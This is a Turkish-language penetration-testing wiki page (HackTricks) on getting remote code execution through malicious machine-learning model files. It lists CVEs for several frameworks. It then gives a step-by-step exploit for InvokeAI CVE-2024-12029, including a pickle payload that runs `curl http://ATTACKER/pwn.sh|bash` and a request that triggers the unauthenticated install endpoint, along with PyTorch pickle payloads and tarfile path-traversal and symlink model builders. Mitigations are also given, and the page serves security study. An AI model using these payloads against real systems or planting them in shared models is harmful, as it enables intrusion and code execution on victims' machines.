# Modeller RCE

{{#include ../banners/hacktricks-training.md}}

## Modellerin RCE'ye Yüklenmesi

Makine Öğrenimi modelleri genellikle ONNX, TensorFlow, PyTorch gibi farklı formatlarda paylaşılır. Bu modeller, geliştiricilerin makinelerine veya üretim sistemlerine yüklenerek kullanılabilir. Genellikle modeller kötü niyetli kod içermemelidir, ancak bazı durumlarda model, sistemde rastgele kod çalıştırmak için kullanılabilir; bu, ya beklenen bir özellik ya da model yükleme kütüphanesindeki bir güvenlik açığı nedeniyle olabilir.

Yazım anında bu tür güvenlik açıklarına bazı örnekler şunlardır:

| **Framework / Araç**       | **Güvenlik Açığı (varsa CVE)**                                                                                               | **RCE Vektörü**                                                                                                                        | **Referanslar**                             |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------|---------------------------------------------|
| **PyTorch** (Python)        | *Güvensiz serileştirme* `torch.load` **(CVE-2025-32434)**                                                                  | Model kontrol noktasındaki kötü niyetli pickle, kod çalıştırmaya yol açar ( `weights_only` korumasını atlayarak)                       | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                        | SSRF + kötü niyetli model indirme, kod çalıştırmaya neden olur; yönetim API'sinde Java serileştirme RCE                                   | |
| **TensorFlow/Keras**        | **CVE-2021-37678** (güvensiz YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                   | YAML'den model yüklemek `yaml.unsafe_load` kullanır (kod çalıştırma) <br> **Lambda** katmanı ile model yüklemek rastgele Python kodu çalıştırır | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite ayrıştırma)                                                                                       | Özel `.tflite` modeli, tam sayı taşması tetikler → bellek bozulması (potansiyel RCE)                                                  | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                          | `joblib.load` ile bir model yüklemek, saldırganın `__reduce__` yükünü çalıştırır                                                        | |
| **NumPy** (Python)          | **CVE-2019-6446** (güvensiz `np.load`) *tartışmalı*                                                                         | `numpy.load` varsayılan olarak pickle nesne dizilerine izin veriyor – kötü niyetli `.npy/.npz` kod çalıştırmayı tetikler                | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dizin geçişi) <br> **CVE-2024-5187** (tar geçişi)                                                       | ONNX modelinin dış-ağırlık yolu dizinden çıkabilir (rastgele dosyaları okuyabilir) <br> Kötü niyetli ONNX model tar, rastgele dosyaları yazabilir (RCE'ye yol açar) | |
| ONNX Runtime (tasarım riski) | *(CVE yok)* ONNX özel ops / kontrol akışı                                                                                   | Özel operatör içeren model, saldırganın yerel kodunu yüklemeyi gerektirir; karmaşık model grafikleri, istenmeyen hesaplamaları çalıştırmak için mantığı kötüye kullanır | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (yol geçişi)                                                                                             | Model yükleme API'sini `--model-control` etkinleştirildiğinde kullanmak, dosyaları yazmak için göreli yol geçişine izin verir (örneğin, RCE için `.bashrc`'yi geçersiz kılmak) | |
| **GGML (GGUF formatı)**     | **CVE-2024-25664 … 25668** (birden fazla bellek taşması)                                                                    | Bozuk GGUF model dosyası, ayrıştırıcıda bellek tamponu taşmalarına neden olur, kurban sistemde rastgele kod çalıştırmayı sağlar          | |
| **Keras (eski formatlar)**  | *(Yeni CVE yok)* Eski Keras H5 modeli                                                                                       | Kötü niyetli HDF5 (`.h5`) modeli, Lambda katmanı kodu yüklenirken hala çalışır (Keras güvenli_modu eski formatı kapsamaz – “gerileme saldırısı”) | |
| **Diğerleri** (genel)       | *Tasarım hatası* – Pickle serileştirme                                                                                      | Birçok ML aracı (örneğin, pickle tabanlı model formatları, Python `pickle.load`) model dosyalarına gömülü rastgele kodu çalıştıracaktır, önlem alınmadıkça | |

Ayrıca, [PyTorch](https://github.com/pytorch/pytorch/security) tarafından kullanılanlar gibi bazı python pickle tabanlı modeller, `weights_only=True` ile yüklenmediklerinde sistemde rastgele kod çalıştırmak için kullanılabilir. Bu nedenle, tabloda listelenmemiş olsalar bile, herhangi bir pickle tabanlı model bu tür saldırılara özellikle duyarlı olabilir.

### 🆕  `torch.load` ile InvokeAI RCE (CVE-2024-12029)

`InvokeAI`, Stable-Diffusion için popüler bir açık kaynak web arayüzüdür. **5.3.1 – 5.4.2** sürümleri, kullanıcıların rastgele URL'lerden modeller indirmesine ve yüklemesine olanak tanıyan `/api/v2/models/install` REST uç noktasını açığa çıkarır.

Uç nokta, nihayetinde şunu çağırır:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Verilen dosya bir **PyTorch checkpoint (`*.ckpt`)** olduğunda, `torch.load` **pickle deserialization** işlemi gerçekleştirir. İçerik doğrudan kullanıcı kontrolündeki URL'den geldiği için, bir saldırgan checkpoint içine özel bir `__reduce__` yöntemi ile kötü niyetli bir nesne yerleştirebilir; bu yöntem **deserialization** sırasında çalıştırılır ve **uzaktan kod yürütme (RCE)** ile sonuçlanır.

Açıklık **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %) olarak atanmıştır.

#### Sömürü adım adım

1. Kötü niyetli bir checkpoint oluşturun:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. `payload.ckpt` dosyasını kontrol ettiğiniz bir HTTP sunucusunda barındırın (örneğin, `http://ATTACKER/payload.ckpt`).
3. Zayıf uç noktayı tetikleyin (kimlik doğrulama gerektirmiyor):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. InvokeAI dosyayı indirdiğinde `torch.load()` çağrılır → `os.system` aracı çalışır ve saldırgan InvokeAI sürecinin bağlamında kod yürütme kazanır.

Hazır exploit: **Metasploit** modülü `exploit/linux/http/invokeai_rce_cve_2024_12029` tüm akışı otomatikleştirir.

#### Koşullar

•  InvokeAI 5.3.1-5.4.2 (tarama bayrağı varsayılan **false**)
•  Saldırgan tarafından erişilebilir `/api/v2/models/install`
•  Sürecin shell komutlarını yürütme izni var

#### Önlemler

* **InvokeAI ≥ 5.4.3** sürümüne yükseltin – yamanın varsayılan olarak `scan=True` ayarını yapar ve serileştirmeden önce kötü amaçlı yazılım taraması gerçekleştirir.
* Kontrol noktalarını programlı olarak yüklerken `torch.load(file, weights_only=True)` veya yeni [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) yardımcı programını kullanın.
* Model kaynakları için izin listelerini / imzaları zorlayın ve hizmeti en az ayrıcalıkla çalıştırın.

> ⚠️ Unutmayın ki **herhangi bir** Python pickle tabanlı format (birçok `.pt`, `.pkl`, `.ckpt`, `.pth` dosyası dahil) güvenilmeyen kaynaklardan serileştirilmesi açısından doğası gereği güvensizdir.

---

Bir ters proxy arkasında eski InvokeAI sürümlerini çalıştırmanız gerekiyorsa, ad-hoc bir önlem örneği:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
## Örnek – kötü niyetli bir PyTorch modeli oluşturma

- Modeli oluşturun:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Modeli yükle:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## Modeller ile Yol Traversali

[**bu blog yazısında**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) belirtildiği gibi, farklı AI çerçeveleri tarafından kullanılan çoğu model formatı arşivlere dayanmaktadır, genellikle `.zip`. Bu nedenle, bu formatların kötüye kullanılarak yol traversali saldırıları gerçekleştirilmesi mümkün olabilir; bu da modelin yüklü olduğu sistemden rastgele dosyaların okunmasına olanak tanır.

Örneğin, aşağıdaki kod ile yüklendiğinde `/tmp` dizininde bir dosya oluşturacak bir model oluşturabilirsiniz:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Aşağıdaki kod ile yüklendiğinde `/tmp` dizinine bir symlink oluşturacak bir model oluşturabilirsiniz:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
## Referanslar

- [OffSec blog – "CVE-2024-12029 – InvokeAI Güvensiz Verilerin Deserialization'ı"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI yamanın commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit modül belgeleri](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – torch.load için güvenlik değerlendirmeleri](https://pytorch.org/docs/stable/notes/serialization.html#security)

{{#include ../banners/hacktricks-training.md}}
